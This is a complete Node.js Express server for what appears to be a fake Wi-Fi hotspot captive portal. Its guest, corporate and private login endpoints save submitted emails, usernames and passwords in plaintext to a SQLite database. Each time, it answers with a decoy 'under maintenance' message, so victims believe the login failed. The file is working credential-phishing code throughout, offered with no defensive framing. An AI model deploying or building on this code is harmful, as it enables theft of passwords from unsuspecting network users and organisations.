// server.js
const express = require('express');
const bodyParser = require('body-parser');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const morgan = require('morgan');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 80;
const DB_PATH = path.join(__dirname, 'data', 'portal.db');

// Middleware
app.use(morgan('dev'));
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Helper: run a query
function insertAndRespond(table, fields, req, res) {
  const keys = Object.keys(fields);
  const placeholders = keys.map(() => '?').join(',');
  const sql = `INSERT INTO ${table} (${keys.join(',')}) VALUES (${placeholders})`;
  const values = keys.map(k => fields[k]);
  const db = new sqlite3.Database(DB_PATH);
  db.run(sql, values, function(err) {
    if (err) {
      console.error(err);
      return res.status(500).json({ success: false, code: 500, message: 'Internal server error' });
    }
    return res.status(200).json({ success: false, code: 400, message: 'Hotspot currently under maintenance' });
  });
  db.close();
}

const guestPwRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[._\-?!%])[A-Za-z0-9._\-?!%]{8,}$/;

// API endpoints
app.post('/api/guests', (req, res) => {
  const { email, password } = req.body;
  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).json({ success: false, code: 400, message: 'Invalid email' });
  }
  if (!guestPwRegex.test(password)) {
    return res.status(400).json({ success: false, code: 400,
      message: 'Password must be \u22658 chars, one upper/lower/number, one of ._-?!%, no other chars' });
  }
  insertAndRespond('guests', { email, password }, req, res);
});

app.post('/api/corp', (req, res) => {
  const { username, password } = req.body;
  if (!username) {
    return res.status(400).json({ success: false, code: 400, message: 'Username required' });
  }
  if (!password) {
    return res.status(400).json({ success: false, code: 400, message: 'Password required' });
  }
  insertAndRespond('corp', { username, password }, req, res);
});

app.post('/api/private', (req, res) => {
  const { username, password } = req.body;
  if (!username) {
    return res.status(400).json({ success: false, code: 400, message: 'Username required' });
  }
  if (!password) {
    return res.status(400).json({ success: false, code: 400, message: 'Password required' });
  }
  insertAndRespond('private', { username, password }, req, res);
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
